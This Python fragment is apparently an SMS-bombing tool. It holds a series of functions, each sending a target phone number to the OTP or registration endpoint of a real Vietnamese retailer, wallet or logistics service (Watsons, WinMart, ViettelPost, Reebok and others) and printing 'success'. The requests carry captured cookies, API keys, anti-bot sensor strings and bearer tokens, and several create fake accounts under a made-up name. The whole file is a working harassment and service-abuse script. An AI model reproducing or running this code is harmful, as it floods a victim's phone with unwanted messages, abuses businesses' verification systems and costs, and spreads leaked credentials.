    url1 = "https://mobile.useinsider.com/api/v3/session/start"

    payload1 = json.dumps({
    "insider_id": random_id,
    "partner_name": "appotapay",
    "reason": "default",
    "udid": random_id,
    "device_info": {
        "location_enabled": False,
        "app_version": "5.2.10",
        "push_enabled": True,
        "os_version": "17.0.2",
        "battery": 90,
        "sdk_version": "13.4.3-RN-6.4.4-nh",
        "connection": "wifi"
    }
    })

    headers1 = {
    'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Content-Type': "application/json",
    'ts': "1722417438",
    'accept-language': "vi-VN,vi;q=0.9"
    }

    response1 = requests.post(url1, data=payload1, headers=headers1)
    print('thành Công') #("Response APPOTA 1:", response1.text)

    # Request 2
    url2 = "https://api.gw.ewallet.appota.com/v2/users/check_valid_fields"

    payload2 = json.dumps({
    "phone_number": sdt,
    "email": "",
    "username": "",
    "ts": 1722417439,
    "signature": "480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11"
    })

    headers2 = {
    'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Content-Type': "application/json",
    'client-version': "5.2.10",
    'aw-device-id': formatted_device_id,
    'language': "vi",
    'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
    'x-device-id': formatted_device_id,
    'x-client-build': "119",
    'x-client-version': "5.2.10",
    'platform': "ios",
    'accept-language': "vi-vn",
    'x-client-platform': "ios",
    'ref-client': "appwallet",
    'x-request-id': "3643ec43-20c4-446d-b3b0-0ac86adf5528",
    'x-request-ts': "1722417439"
    }

    response2 = requests.post(url2, data=payload2, headers=headers2)
    print('thành Công') #("Response APPOTA 2:", response2.text)

    # Request 3
    url3 = "https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code"

    payload3 = json.dumps({
    "phone_number": sdt,
    "sender": "SMS",
    "ts": 1722417441,
    "signature": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
    })

    headers3 = {
    'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Content-Type': "application/json",
    'client-version': "5.2.10",
    'aw-device-id': formatted_device_id,
    'language': "vi",
    'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
    'x-device-id': formatted_device_id,
    'x-client-build': "119",
    'x-client-version': "5.2.10",
    'platform': "ios",
    'accept-language': "vi-vn",
    'x-client-platform': "ios",
    'ref-client': "appwallet",
    'x-request-id': "4031b828-a4fc-45cb-aeac-c6e3b2f504ab",
    'x-request-ts': "1722417441"
    }

    response3 = requests.post(url3, data=payload3, headers=headers3)
    print('thành Công') #("Response APPOTA 3:", response3.text)







def send_otp_via_Watsons(sdt):

    url = "https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep"

    params = {
    'lang': "vi"
    }

    payload = json.dumps({
    "otpTokenRequest": {
        "action": "REGISTRATION",
        "type": "SMS",
        "countryCode": "84",
        "target": sdt
    },
    "defaultAddress": {
        "mobileNumberCountryCode": "84",
        "mobileNumber": sdt
    },
    "mobileNumber": sdt
    })

    headers = {
    'User-Agent': "WTCVN/24050.8.0 (iOS/17.0.2)",
    'Accept': "application/json, text/plain, */*",
    'Content-Type': "application/json",
    'x-session-token': "5b3f554c05258ea55ab506a1ffc7aa8d",
    'baggage': "sentry-environment=preprod,sentry-public_key=8d22ab30a0174b6489b1e647ff6a8a28,sentry-release=vn.com.watsons.app%4024050.8.0%2B202407111813,sentry-trace_id=57b207211ecb40ad880861651a5e1914",
    'waiting-room-access-token': "",
    'x-app-name': "Watsons%20VN",
    'x-acf-sensor-data': "4,i,QeSJMIt5h2iaPmIbvXvXq4tVimb8YYYoz9HVkaOkZ4+50dFkANwHVTHJruLOhscngAw9Ajbz0ri+8cJcbazXBtp8Zn1dVjoqDt2YHcMy/yzo2Wjm+Zbvhxlb9t428/+fUnEMAsO67eNo5E8d2NjKOEFsAS+/AhDaXP0+raig9UU=,nAPyAaP9OJeaQNum0Y6YD8WCUBTFQKSGe/JvZkOrtTuLVg4V6hbPeNgDHVgxQeTc1kD+f39Lpk9739rigwa9dWFav4AM7lc8JpVCNuDFC44k5/UQKyt8gAZz+9hkEk6wzYB7o2ezvooWZEXQTZumLksEu6Nf41juprM/tD3KBmI=$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$7,3,12$$",
    'accept-language': "vi",
    'queue-target': "null",
    'cache-control': "no-cache",
    'sentry-trace': "57b207211ecb40ad880861651a5e1914-4b3ff6172e084c9d-0",
    'x-app-version': "24050.8.0",
    'env': "prod",
    'Cookie': "ak_bmsc=4ACC8C3607E0E9232360FDA1E1854E4F~000000000000000000000000000000~YAAQ9VJNG979NwaRAQAA/r9eCBi3G4NOUhKyBSBzBjyDhSfmrUMlGbtziWkFwdlHDattQysx6ioqzAwBYysRMFRqwZNTLa5UIwKiMCqQK52EXJca1/mPkvDYKlUNY6jMqBp8gA0T/uUQNLb+ADwajazL1i/y/uerZjb1BWt4OlsKrjPijiMfqPIW3MhtNi0jydTzlN2GyA9+mOZ16Vbsvdlo4Y+wr1aQAz+eqVktxM+b61s5xpAUDRo5bItDmWb2AjIJyyFU6QmLtiO+z/fwZvUUinqpOZpqrPboLMWwk8M2Jw6KKE/FIloJcpNvF+MUcPxGpI2YlEYshvYxxxYBH+Vn9mdRSYayp6sadTKWrMhVgaObxee0B9CzbCgiY+yxTlapAx7YiqgX4Q==; dtCookie=v_4_srv_36_sn_3F2A2BE1202593EA006C41DC139C0176_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; ROUTE=.accstorefront-78c88c89d7-lvpvg; authorization=pUbs8G_8XY2Hx9NiB8aJ3NCtnxk; token_type=guest"
    }

    response = requests.post(url, params=params, data=payload, headers=headers)
    print('thành Công') #("OTP SEND Watsons:", response.text)



def send_otp_via_hoangphuc(sdt):
    cookies = {
        'form_key': 'fm7TzaicsnmIyKbm',
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'PHPSESSID': '450982644b33ef1223c1657bb0c43204',
        'form_key': 'fm7TzaicsnmIyKbm',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-cache-sessid': 'true',
        'mst-cache-warmer-track': '1722425411057',
        'private_content_version': 'e7d88709c6ccef5f8c32a41289ece818',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=fm7TzaicsnmIyKbm; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=450982644b33ef1223c1657bb0c43204; form_key=fm7TzaicsnmIyKbm; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1722425411057; private_content_version=e7d88709c6ccef5f8c32a41289ece818',
        'dnt': '1',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjA5YWE0NzczZGUzM2IxNTciLCJ0ciI6ImFiMWFmYzBkNDUwMTE1Y2U5ZTE0ZjdhZmZmOTI3MTQ5IiwidGkiOjE3MjI0MjU0NDExMDMsInRrIjoiMTMyMjg0MCJ9fQ==',
        'origin': 'https://hoang-phuc.com',
        'priority': 'u=1, i',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-ab1afc0d450115ce9e14f7afff927149-09aa4773de33b157-01',
        'tracestate': '1322840@nr=0-1-4173019-1120237972-09aa4773de33b157----1722425441103',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
    }

    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
    print('thành Công') #("OTP SEND Hoàng phúc:", response.json)


def send_otp_via_fmcomvn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fm.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fm.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '00c641a2-05fb-4541-b5af-220b4b0aa23c',
    }

    json_data = {
        'Phone': sdt,
        'LatOfMap': '106',
        'LongOfMap': '108',
        'Browser': '',
    }

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)

    print('thành Công') #("OTP SEND FM.COM.VN:", response.text)


def send_otp_via_Reebokvn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'key': '63ea1845891e8995ecb2304b558cdeab',
        'origin': 'https://reebok.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1722425836500',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    response = requests.post(
        'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND Reebokvn:", response.text)



def send_otp_via_thefaceshop(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'key': 'c3ef5fcbab3e7ebd82794a39da791ff6',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1722425954937',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    response = requests.post(
        'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND thefaceshop:", response.text)


def send_otp_via_BEAUTYBOX(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'key': 'ac41e98f028aa44aac947da26ceb7cff',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1722426119478',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    response = requests.post(
        'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND BEAUTY BOX:", response.text)



def send_otp_via_winmart(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'Nguyễn Quang Ngọc',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2000-02-05',
        'gender': 'Male',
    }

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)

    print('thành Công') #("OTP SEND winmart:", response.text)

def send_otp_via_medicare(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'SERVER=nginx2; XSRF-TOKEN=eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6ImJ2NlA2U253YkQ0NXFoWXRtSVpYcHc9PSIsInZhbHVlIjoiUjk0N0k1cytwTzFqV3d6UjFwUUJOZ09HMTdDdTJzWTR2WSswblhFWkxhVTFiZVkyUTlHelN2Ympvb0VidVgrYUFnT0s3WkRCeTdDcmJMK2RtM1J3YUxBUm5aOUtvaUZ0R2lmMURBR2o3UUxLQTZ6ODBJVFNsTnN0NUNocHJVZ1QiLCJtYWMiOiI0ZTA4NTc0MjE2MGUzYTFiZWU2MjNhMmVkOTUzMWFiMWYxMDJjNTRiMmJiZmUyMzU1YmZjZTQxNTA2Zjc0Zjc2IiwidGFnIjoiIn0%3D',
        'DNT': '1',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-XSRF-TOKEN': 'eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }

    response = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data)

    print('thành Công') #("OTP SEND medicare:", response.text)




def send_otp_via_futabus(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://futabus.vn',
        'priority': 'u=1, i',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjBjYjQyNzQyYWU1OGY0ZGE0NjdiY2RhZWE0Yjk1YTI5ZmJhMGM1ZjkiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMjQyNDU2MywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIyNDI0NTYzLCJleHAiOjE3MjI0MjgxNjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.nP7jES3RVs4QgGnUoJKXml9KS7ZjOwuMlSaRklAjA7Kp8bKGmJRJFCLb1bX_am-nXovNAQ9mZ_68k7BII6SEahctrppOqeubMO-rtOfS8zOGd0_9_fWi9DBIEjEjuNJYhd55USesLwVtb5zd3fg5qjbC-QZAKo4J-V61HQvQEIBEe2EDSqDKGdtsZZ7ph33Kl5vGcpINGH-yt-2gkFAmyaoft6PpjjcS7wC_RpRkGi_bwUxG6JNXQUyBZq82T84JuqdolplXABMxd1gSBLNeBazriCAGYLsRexuvFHoet7VvEnlSm3Gnlf1oTIuR0nm1qRPsOA5W-RbZzu45fSv5jQ',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
        'use_for': 'LOGIN',
    }

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)

    print('thành Công') #("OTP SEND futabus:", response.text)



def send_otp_via_ViettelPost(sdt):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.139_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-6owN8knL2LbNscfq8MFTRbw99Sv3SFBfrd1CJOj7uAeEKh6JTpmTaQY6SQyxuO1FiTR7b5yt9vSgof__Zpr9Aiscx8VXG8mf2fhiL19u2aGDm-ekRWdqgJUq_eCLNleE',
        'DNT': '1',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormRegister.FullName': 'Nguyễn Quang Ngọc',
        'FormRegister.Phone': sdt,
        'FormRegister.Password': 'BEAUTYBOX12a@',
        'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt',
        'ConfirmOtpType': 'Register',
        'FormRegister.IsRegisterFromPhone': 'true',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
    }

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', headers=headers, data=data)
    print('thành Công') #("OTP SEND ViettelPost: oke đã gửi")


def send_otp_via_myviettel2(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
